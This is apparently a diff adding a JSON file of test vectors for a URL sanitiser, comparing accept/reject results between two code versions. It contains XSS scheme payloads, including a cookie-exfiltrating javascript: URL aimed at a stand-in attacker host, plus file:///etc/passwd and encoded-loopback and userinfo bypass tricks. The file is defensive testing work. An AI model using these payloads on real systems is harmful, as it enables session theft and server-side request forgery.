@@ -1,0 +1,731 @@
+[
+ {
+  "id": 1,
+  "input": "javascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "javascript:"
+ },
+ {
+  "id": 2,
+  "input": "javascript:fetch('//attacker/'+document.cookie)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "javascript: exfiltration"
+ },
+ {
+  "id": 3,
+  "input": "JaVaScRiPt:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "case variation"
+ },
+ {
+  "id": 4,
+  "input": "JavaScript:alert(1)",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "case variation"
+ },
+ {
+  "id": 5,
+  "input": "JAVASCRIPT:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "case variation"
+ },
+ {
+  "id": 6,
+  "input": "\tjavascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "leading control char"
+ },
+ {
+  "id": 7,
+  "input": "\njavascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "leading control char"
+ },
+ {
+  "id": 8,
+  "input": " javascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "leading whitespace"
+ },
+ {
+  "id": 9,
+  "input": "  javascript:alert(1)  ",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "surrounding whitespace"
+ },
+ {
+  "id": 10,
+  "input": "java\tscript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "embedded control char"
+ },
+ {
+  "id": 11,
+  "input": "java\nscript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "embedded newline"
+ },
+ {
+  "id": 12,
+  "input": "java\rscript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "embedded CR"
+ },
+ {
+  "id": 13,
+  "input": "javascript:alert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "embedded DEL"
+ },
+ {
+  "id": 14,
+  "input": "javascript://evil.com/%0aalert(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "nested scheme w/ authority"
+ },
+ {
+  "id": 15,
+  "input": "data:text/html,<script>alert(1)</script>",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "data:"
+ },
+ {
+  "id": 16,
+  "input": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "data: base64"
+ },
+ {
+  "id": 17,
+  "input": "data://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "data: with authority"
+ },
+ {
+  "id": 18,
+  "input": "vbscript:msgbox(1)",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "vbscript:"
+ },
+ {
+  "id": 19,
+  "input": "blob:https://example.com/uuid",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "blob:"
+ },
+ {
+  "id": 20,
+  "input": "blob:https://example.com/abc",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "blob:"
+ },
+ {
+  "id": 21,
+  "input": "file:///etc/passwd",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "file:"
+ },
+ {
+  "id": 22,
+  "input": "mailto:a@b.com",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "mailto:"
+ },
+ {
+  "id": 23,
+  "input": "ftp://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "non-allowlisted special scheme"
+ },
+ {
+  "id": 24,
+  "input": "ftp://example.com/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "non-allowlisted special scheme"
+ },
+ {
+  "id": 25,
+  "input": "ws://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "non-allowlisted special scheme"
+ },
+ {
+  "id": 26,
+  "input": "wss://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "non-allowlisted special scheme"
+ },
+ {
+  "id": 27,
+  "input": "httpx://evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "prefix-vs-membership"
+ },
+ {
+  "id": 28,
+  "input": "",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "empty input"
+ },
+ {
+  "id": 29,
+  "input": "   ",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "whitespace-only input"
+ },
+ {
+  "id": 30,
+  "input": null,
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "null input"
+ },
+ {
+  "id": 31,
+  "input": "__UNDEFINED__",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "undefined input"
+ },
+ {
+  "id": 32,
+  "input": "not-a-url",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "bare word"
+ },
+ {
+  "id": 33,
+  "input": "not a url",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "bare word with space"
+ },
+ {
+  "id": 34,
+  "input": "/relative/path",
+  "main": "R",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "absolute-path relative ref"
+ },
+ {
+  "id": 35,
+  "input": "//evil.com/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "protocol-relative"
+ },
+ {
+  "id": 36,
+  "input": "//example.com/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "protocol-relative"
+ },
+ {
+  "id": 37,
+  "input": "http://",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "scheme without host"
+ },
+ {
+  "id": 38,
+  "input": "https://",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "scheme without host"
+ },
+ {
+  "id": 39,
+  "input": "http://[::1/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "malformed IPv6 host"
+ },
+ {
+  "id": 40,
+  "input": "http://exa mple.com",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "bare space in host"
+ },
+ {
+  "id": 41,
+  "input": "https://example.com:99999/x",
+  "main": "R",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "out-of-range port"
+ },
+ {
+  "id": 42,
+  "input": "https://github.com/o/r/pull/1",
+  "main": "A",
+  "mainValue": "https://github.com/o/r/pull/1",
+  "branch": null,
+  "branchValue": null,
+  "cls": "allowed https"
+ },
+ {
+  "id": 43,
+  "input": "http://example.com/x",
+  "main": "A",
+  "mainValue": "http://example.com/x",
+  "branch": null,
+  "branchValue": null,
+  "cls": "allowed http (contested)"
+ },
+ {
+  "id": 44,
+  "input": "HtTpS://example.com",
+  "main": "A",
+  "mainValue": "HtTpS://example.com",
+  "branch": null,
+  "branchValue": null,
+  "cls": "case variation, identity return"
+ },
+ {
+  "id": 45,
+  "input": "https://example.com:8443/x",
+  "main": "A",
+  "mainValue": "https://example.com:8443/x",
+  "branch": null,
+  "branchValue": null,
+  "cls": "allowed https with port"
+ },
+ {
+  "id": 46,
+  "input": "https://example.com/x?a=1&b=2#frag",
+  "main": "A",
+  "mainValue": "https://example.com/x?a=1&b=2#frag",
+  "branch": null,
+  "branchValue": null,
+  "cls": "query+fragment"
+ },
+ {
+  "id": 47,
+  "input": "https://user:pass@example.com/x",
+  "main": "A",
+  "mainValue": "https://user:pass@example.com/x",
+  "branch": null,
+  "branchValue": null,
+  "cls": "userinfo (RULED: reject)"
+ },
+ {
+  "id": 48,
+  "input": "https://EXAMPLE.com/X",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "case variation host/path"
+ },
+ {
+  "id": 49,
+  "input": "http://例え.jp/x",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "IDN/unicode host"
+ },
+ {
+  "id": 50,
+  "input": "http://[::1]/x",
+  "main": "A",
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "IPv6 loopback (C1, subsumed by C2)"
+ },
+ {
+  "id": 51,
+  "input": "http:/\\/\\evil.com",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "backslash host confusion"
+ },
+ {
+  "id": 52,
+  "input": "http:/example.com",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "single-slash host"
+ },
+ {
+  "id": 53,
+  "input": "http:example.com",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "opaque, no slash"
+ },
+ {
+  "id": 54,
+  "input": "http://example.com/a b",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "bare space in path"
+ },
+ {
+  "id": 55,
+  "input": "https://example.com/x\n",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "trailing newline"
+ },
+ {
+  "id": 56,
+  "input": "http://example.com/%zz",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "bad percent escape"
+ },
+ {
+  "id": 57,
+  "input": "https:///x",
+  "main": "A",
+  "mainValue": null,
+  "branch": null,
+  "branchValue": null,
+  "cls": "empty host with path"
+ },
+ {
+  "id": 58,
+  "input": "http://example.com/issues/1",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "plain http (contested)"
+ },
+ {
+  "id": 59,
+  "input": "http://localhost.evil.example/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "host-prefix confusion"
+ },
+ {
+  "id": 60,
+  "input": "http://evil.example/?q=localhost",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "allowlist token in query"
+ },
+ {
+  "id": 61,
+  "input": "http://localhost@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "userinfo host confusion"
+ },
+ {
+  "id": 62,
+  "input": "http://evil.example\\@localhost/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "backslash userinfo trick"
+ },
+ {
+  "id": 63,
+  "input": "http://localhost。evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "homoglyph ideographic dot"
+ },
+ {
+  "id": 64,
+  "input": "http://localhost:8080/tasks/1",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "loopback (prod config)"
+ },
+ {
+  "id": 65,
+  "input": "http://127.0.0.1:3000/tasks/1",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "loopback (prod config)"
+ },
+ {
+  "id": 66,
+  "input": "http://0x7f000001/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "hex-encoded loopback"
+ },
+ {
+  "id": 67,
+  "input": "http://2130706433/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "decimal-encoded loopback"
+ },
+ {
+  "id": 68,
+  "input": "http://127.1/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "short-form loopback"
+ },
+ {
+  "id": 69,
+  "input": "http://0177.0.0.1/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "octal-encoded loopback"
+ },
+ {
+  "id": 70,
+  "input": "http://127．0．0．1/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "fullwidth-dot loopback"
+ },
+ {
+  "id": 71,
+  "input": "http://0x7f000001:9200/api",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "hex loopback with port"
+ },
+ {
+  "id": 72,
+  "input": "https://user:pass@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "userinfo (RULED: reject)"
+ },
+ {
+  "id": 73,
+  "input": "https://ok.example@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "userinfo destination confusion"
+ },
+ {
+  "id": 74,
+  "input": "https://github.com@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "userinfo lookalike"
+ },
+ {
+  "id": 75,
+  "input": "https://:pass@evil.example/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "password-only userinfo"
+ },
+ {
+  "id": 76,
+  "input": "http://user:pass@localhost/",
+  "main": null,
+  "mainValue": null,
+  "branch": "R",
+  "branchValue": null,
+  "cls": "loopback with credentials"
+ },
+ {
+  "id": 77,
+  "input": "https://github.com/acme/repo/issues/12",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://github.com/acme/repo/issues/12",
+  "cls": "allowed https"
+ },
+ {
+  "id": 78,
+  "input": "HTTPS://github.com/acme/repo",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://github.com/acme/repo",
+  "cls": "case variation, NORMALISED"
+ },
+ {
+  "id": 79,
+  "input": "  https://github.com/acme/repo  ",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://github.com/acme/repo",
+  "cls": "surrounding ws, NORMALISED"
+ },
+ {
+  "id": 80,
+  "input": "https://example.com",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://example.com/",
+  "cls": "path NORMALISED"
+ },
+ {
+  "id": 81,
+  "input": "https://localhost:8443/x",
+  "main": null,
+  "mainValue": null,
+  "branch": "A",
+  "branchValue": "https://localhost:8443/x",
+  "cls": "https on loopback"
+ }
+]
